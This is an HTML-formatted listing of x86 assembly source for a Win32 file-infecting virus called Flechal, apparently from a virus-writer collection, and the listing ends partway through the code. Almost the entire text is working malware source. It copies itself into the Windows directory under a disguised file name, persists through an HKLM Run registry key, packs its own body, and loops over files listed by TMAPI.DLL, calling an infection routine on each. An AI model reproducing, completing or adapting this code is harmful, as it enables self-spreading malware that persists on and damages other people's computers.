<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Flechal - FLECHAL.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">   </span><span class="sc1">;              W32.FRECHAL      By: Weendigo</span><span class="sc0">

   </span><span class="sc2">.586p</span><span class="sc0">
   </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

   </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">yes</span><span class="sc0">

   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">STRUC.INC</span><span class="sc0">

   </span><span class="sc9">.code</span><span class="sc0">

   </span><span class="sc5">_start</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">orig_esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">l_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_start</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_ini</span><span class="sc0">

   </span><span class="sc1">;  decrypt pack engine header</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">aplib@006</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">_ap_not</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">_ap_not</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Flechal</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">lpszSubKey_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_openmutex</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_exit_com_del</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_exit_com_del</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NAM_flechal</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_exit_com_del</span><span class="sc0">

   </span><span class="sc1">; try to retrieve our registry key</span><span class="sc0">
   </span><span class="sc1">; and compare it with the current</span><span class="sc0">
   </span><span class="sc1">; filename</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Software</span><span class="sc0">\</span><span class="sc5">Microsoft</span><span class="sc0">\</span><span class="sc5">Windows</span><span class="sc0">\</span><span class="sc5">CurrentVersion</span><span class="sc0">\</span><span class="sc5">Run</span><span class="sc4">~</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc0">

   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">REG_NONE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpszSubKey_1</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">__install</span><span class="sc0">

   </span><span class="sc1">; compare strings</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NAM_flechal</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcmpi</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_default</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_openmutex</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_install</span><span class="sc0">

   </span><span class="sc5">_exit_com_del</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; wait 2 seconds and delete itself</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EXIT</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">orig_esp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

   </span><span class="sc5">__install</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">  </span><span class="sc1">;  RegQueryValueExA</span><span class="sc0">

   </span><span class="sc5">_install</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; we've to install flechal</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NAM_flechal</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> \</span><span class="sc5">COMMAND</span><span class="sc0">\</span><span class="sc5">NBKSULF.EXE</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_copydone</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_exit_com_del</span><span class="sc0">

   </span><span class="sc5">_copydone</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">REG_SZ</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpszSubKey_1</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc0">   

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SW_SHOW</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">ShellExecuteA</span><span class="sc0">

   </span><span class="sc5">_exit</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">orig_esp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

   </span><span class="sc5">_default</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hWnd_imagehlp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hWnd_tmapi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_flechal1.0</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CreateMutexA</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc1">;  we've to init some fields</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NAM_flechal</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_open_read</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_exit</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">workmem</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_viral_temp_buffer_1</span><span class="sc0"> </span><span class="sc1">;  output</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_ap_pack</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_viral_temp_sz</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_exit</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">flechal</span><span class="sc0">\</span><span class="sc5">GOAT.DLL</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_infect</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">flechal1.0</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TMAPI.DLL</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hWnd_tmapi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_out_tmapi</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InitTmTable</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_tmapi</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">InitTmTable</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_unloadtmapi</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetTmElementByIndex</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_tmapi</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">GetTmElementByIndex</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_unloadtmapi</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CloseTmTable</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_tmapi</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">CloseTmTable</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_unloadtmapi</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TMAPI.DLL</span><span class="sc4">|</span><span class="sc5">LOADED</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">index_tm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InitTmTable</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc5">_search_via_tmapi</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">index_tm</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetTmElementByIndex</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">index_tm</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_search_end</span><span class="sc0">

   </span><span class="sc1">; infection routine here</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_infect</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_search_via_tmapi</span><span class="sc0">

   </span><span class="sc5">_search_end</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseTmTable</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TMAPI.DLL</span><span class="sc4">|</span><span class="sc5">UNLOAD</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

